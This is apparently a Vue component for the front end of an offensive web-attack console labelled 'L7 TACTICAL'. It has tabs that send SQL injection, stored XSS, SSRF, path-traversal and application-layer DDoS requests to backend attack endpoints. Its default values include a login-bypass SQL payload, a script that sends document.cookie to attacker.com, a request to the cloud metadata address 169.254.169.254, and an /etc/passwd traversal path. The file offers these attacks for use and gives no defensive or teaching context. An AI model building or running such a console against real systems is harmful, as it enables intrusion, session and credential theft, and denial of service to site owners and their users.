<script setup lang="ts">
import { ref } from 'vue'
import { api } from '@/api/client'
import AttackToolLayout from '@/components/AttackToolLayout.vue'
import LogTerminal from '@/components/LogTerminal.vue'

const activeTab = ref('sqli')

// Logs
const terminalLogs = ref<string[]>([])

function log(msg: string) {
  const timestamp = new Date().toLocaleTimeString('en-US', { hour12: false })
  terminalLogs.value.push(`[${timestamp}] ${msg}`)
}

const tabs = [
  { id: 'sqli', label: 'SQL INJECTION' },
  { id: 'xss', label: 'CROSS-SITE SCRIPTING' },
  { id: 'ssrf', label: 'SSRF' },
  { id: 'lfi', label: 'LOCAL FILE INCLUSION' },
  { id: 'ddos', label: 'APP LAYER DDoS' },
]

// SQLi State
const sqliTargetUrl = ref('http://10.0.0.5/login.php')
const sqliPayload = ref("' OR '1'='1")

async function runSqli() {
  log(`> Injecting SQL payload into ${sqliTargetUrl.value}...`)
  try {
    const { data: res } = await api.post('/api/layer7/sqli', {
      target_url: sqliTargetUrl.value,
      injection_payload: sqliPayload.value
    })
    log(`[${res.status.toUpperCase()}] ${res.message}`)
  } catch (err: any) {
    log(`[ERROR] SQLi failed: ${err.message}`)
  }
}

// XSS State
const xssTargetUrl = ref('http://10.0.0.5/guestbook.php')
const xssPayload = ref("<script>fetch('http://attacker.com/steal?cookie='+document.cookie)<\\/script>")

async function runXss() {
  log(`> Storing XSS payload on ${xssTargetUrl.value}...`)
  try {
    const { data: res } = await api.post('/api/layer7/xss', {
      target_url: xssTargetUrl.value,
      script_payload: xssPayload.value
    })
    log(`[SUCCESS] ${res.message}`)
  } catch (err: any) {
    log(`[ERROR] XSS injection failed: ${err.message}`)
  }
}

// SSRF State
const ssrfTargetUrl = ref('http://10.0.0.5/fetch_image.php?url=')
const ssrfInternalTarget = ref('http://169.254.169.254/latest/meta-data/')

async function runSsrf() {
  log(`> Exploiting SSRF against ${ssrfTargetUrl.value}...`)
  try {
    const { data: res } = await api.post('/api/layer7/ssrf', {
      target_url: ssrfTargetUrl.value,
      internal_target: ssrfInternalTarget.value
    })
    log(`[SUCCESS] ${res.message}`)
  } catch (err: any) {
    log(`[ERROR] SSRF failed: ${err.message}`)
  }
}

// LFI State
const lfiTargetUrl = ref('http://10.0.0.5/index.php?page=')
const lfiFilePath = ref('../../../../../../../etc/passwd')

async function runLfi() {
  log(`> Attempting Path Traversal on ${lfiTargetUrl.value}...`)
  try {
    const { data: res } = await api.post('/api/layer7/lfi', {
      target_url: lfiTargetUrl.value,
      file_path: lfiFilePath.value
    })
    log(`[SUCCESS] ${res.message}`)
  } catch (err: any) {
    log(`[ERROR] LFI failed: ${err.message}`)
  }
}

// App DDoS State
const ddosTargetUrl = ref('http://10.0.0.5')
const ddosType = ref('Slowloris')

async function runAppDdos() {
  log(`> Initiating Application Layer DDoS (${ddosType.value}) against ${ddosTargetUrl.value}...`)
  try {
    const { data: res } = await api.post('/api/layer7/app-ddos', {
      target_url: ddosTargetUrl.value,
      attack_type: ddosType.value
    })
    log(`[SUCCESS] ${res.message}`)
  } catch (err: any) {
    log(`[ERROR] App DDoS failed: ${String(err)}`)
  }
}
</script>

<template>
  <AttackToolLayout
    title="L7 TACTICAL"
    titleClass="title-l7"
    themeClass="theme-l7"
    :tabs="tabs"
    v-model:activeTab="activeTab"
  >

        <template v-if="activeTab === 'sqli'">
          <h3>SQL INJECTION (SQLi)</h3>
          <p class="description">Exploit poor input validation to manipulate backend database queries, extract data, or bypass authentication.</p>
          <div class="form-group">
            <label>Vulnerable Endpoint URL</label>
            <input v-model="sqliTargetUrl" type="text" />
          </div>
          <div class="form-group">
            <label>Injection Payload</label>
            <textarea v-model="sqliPayload" rows="3" class="dark-textarea"></textarea>
          </div>
          <button class="btn btn-danger" @click="runSqli">EXECUTE SQLi</button>
        </template>

        <template v-if="activeTab === 'xss'">
          <h3>CROSS-SITE SCRIPTING (XSS)</h3>
          <p class="description">Inject malicious JavaScript into web pages viewed by other users to steal session cookies or hijack client sessions.</p>
          <div class="form-group">
            <label>Vulnerable Endpoint URL</label>
            <input v-model="xssTargetUrl" type="text" />
          </div>
          <div class="form-group">
            <label>JavaScript Payload</label>
            <textarea v-model="xssPayload" rows="3" class="dark-textarea"></textarea>
          </div>
          <button class="btn btn-danger" @click="runXss">INJECT XSS</button>
        </template>

        <template v-if="activeTab === 'ssrf'">
          <h3>SERVER-SIDE REQUEST FORGERY</h3>
          <p class="description">Force a vulnerable server to make HTTP requests to internal IP addresses (e.g. AWS Metadata or internal admin panels).</p>
          <div class="form-group">
            <label>Vulnerable Endpoint URL</label>
            <input v-model="ssrfTargetUrl" type="text" />
          </div>
          <div class="form-group">
            <label>Internal Target to Reach</label>
            <input v-model="ssrfInternalTarget" type="text" />
          </div>
          <button class="btn btn-danger" @click="runSsrf">EXPLOIT SSRF</button>
        </template>

        <template v-if="activeTab === 'lfi'">
          <h3>LOCAL FILE INCLUSION (LFI)</h3>
          <p class="description">Use Directory Traversal (../) to read arbitrary files from the server's local file system.</p>
          <div class="form-group">
            <label>Vulnerable Endpoint URL</label>
            <input v-model="lfiTargetUrl" type="text" />
          </div>
          <div class="form-group">
            <label>File Path to Extract</label>
            <input v-model="lfiFilePath" type="text" />
          </div>
          <button class="btn btn-danger" @click="runLfi">EXTRACT FILE</button>
        </template>

        <template v-if="activeTab === 'ddos'">
          <h3>APP LAYER DDoS</h3>
          <p class="description">Exhaust server application resources (e.g. thread pools) rather than network bandwidth using targeted attacks.</p>
          <div class="form-group">
            <label>Target Application URL</label>
            <input v-model="ddosTargetUrl" type="text" />
          </div>
          <div class="form-group">
            <label>Attack Vector</label>
            <select v-model="ddosType" class="dark-select">
              <option value="Slowloris">Slowloris (Keep connections open)</option>
              <option value="HTTP Flood">HTTP GET Flood</option>
              <option value="Hash Collision">Hash Collision Attack</option>
            </select>
          </div>
          <button class="btn btn-danger" @click="runAppDdos">ENGAGE DDoS</button>
        </template>
    <template #terminal>
      <LogTerminal :logs="terminalLogs" />
    </template>
  </AttackToolLayout>
</template>
